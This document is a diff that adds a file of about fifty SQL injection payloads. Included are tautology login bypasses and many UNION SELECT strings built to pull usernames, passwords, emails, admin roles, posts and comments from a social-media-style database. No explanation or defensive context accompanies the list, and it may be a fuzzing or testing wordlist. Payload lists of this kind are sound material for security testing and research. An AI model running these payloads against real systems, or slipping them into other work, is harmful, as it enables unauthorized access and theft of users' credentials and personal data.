@@ -1,0 +1,50 @@
+' OR 1=1 --
+' OR 'a'='a' --
+' UNION SELECT NULL, username, password FROM users --
+' UNION SELECT NULL, id, post_title FROM posts --
+' UNION SELECT NULL, id, user_email FROM users --
+' AND 1=1 --
+' AND 'a'='a' --
+' UNION SELECT NULL, username, role FROM users WHERE username='admin' --
+' UNION SELECT NULL, id, comment_text FROM comments --
+' UNION SELECT NULL, id, follower_id FROM followers --
+' UNION SELECT NULL, post_id, post_content FROM posts --
+' UNION SELECT NULL, user_id, user_name FROM users WHERE role='admin' --
+' UNION SELECT NULL, post_id, likes_count FROM posts --
+' UNION SELECT NULL, comment_id, comment_author FROM comments WHERE post_id=1 --
+' UNION SELECT NULL, user_id, user_email FROM users WHERE user_id > 10 --
+' UNION SELECT NULL, post_id, timestamp FROM posts WHERE timestamp > '2023-01-01' --
+' UNION SELECT NULL, comment_id, post_id FROM comments WHERE comment_text LIKE '%great%' --
+' UNION SELECT NULL, id, comment_text FROM comments WHERE comment_text LIKE '%awesome%' --
+' UNION SELECT NULL, user_id, username FROM users WHERE username LIKE 'admin%' --
+' UNION SELECT NULL, post_id, post_content FROM posts WHERE post_content LIKE '%vacation%' --
+' UNION SELECT NULL, post_id, post_date FROM posts WHERE post_date > '2023-06-01' --
+' UNION SELECT NULL, follower_id, followed_user_id FROM followers WHERE follower_id=1 --
+' UNION SELECT NULL, post_id, likes_count FROM posts WHERE post_id=5 --
+' UNION SELECT NULL, user_id, user_name FROM users WHERE username='admin' AND password='admin' --
+' UNION SELECT NULL, comment_id, comment_author FROM comments WHERE post_id=2 --
+' UNION SELECT NULL, post_id, post_title FROM posts WHERE post_title LIKE '%project%' --
+' UNION SELECT NULL, post_id, timestamp FROM posts WHERE timestamp < '2024-01-01' --
+' UNION SELECT NULL, post_id, user_id FROM posts WHERE user_id = 100 --
+' UNION SELECT NULL, comment_id, post_id FROM comments WHERE post_id > 10 --
+' UNION SELECT NULL, post_id, comment_count FROM posts WHERE comment_count > 0 --
+' UNION SELECT NULL, user_id, user_email FROM users WHERE user_email LIKE '%gmail.com' --
+' UNION SELECT NULL, post_id, post_content FROM posts WHERE post_content LIKE '%new product%' --
+' UNION SELECT NULL, user_id, username FROM users WHERE user_id = 5 --
+' UNION SELECT NULL, follower_id, followed_user_id FROM followers WHERE followed_user_id = 10 --
+' UNION SELECT NULL, post_id, likes_count FROM posts WHERE likes_count > 100 --
+' UNION SELECT NULL, post_id, post_content FROM posts WHERE post_content LIKE '%celebration%' --
+' UNION SELECT NULL, comment_id, post_id FROM comments WHERE post_id = 10 --
+' UNION SELECT NULL, user_id, user_name FROM users WHERE user_id < 50 --
+' UNION SELECT NULL, post_id, post_content FROM posts WHERE post_content LIKE '%announcement%' --
+' UNION SELECT NULL, post_id, comment_count FROM posts WHERE comment_count > 5 --
+' UNION SELECT NULL, post_id, post_title FROM posts WHERE post_title LIKE '%launch%' --
+' UNION SELECT NULL, comment_id, user_id FROM comments WHERE user_id = 5 --
+' UNION SELECT NULL, post_id, timestamp FROM posts WHERE timestamp > '2024-01-01' --
+' UNION SELECT NULL, post_id, post_content FROM posts WHERE post_content LIKE '%travel%' --
+' UNION SELECT NULL, user_id, username FROM users WHERE username LIKE 'guest%' --
+' UNION SELECT NULL, post_id, post_description FROM posts WHERE post_description LIKE '%social%' --
+' UNION SELECT NULL, post_id, likes_count FROM posts WHERE post_id=15 --
+' UNION SELECT NULL, user_id, user_name FROM users WHERE role='moderator' --
+' UNION SELECT NULL, comment_id, comment_text FROM comments WHERE comment_text LIKE '%post%' --
+' UNION SELECT NULL, post_id, post_author FROM posts WHERE post_author LIKE '%admin%' --
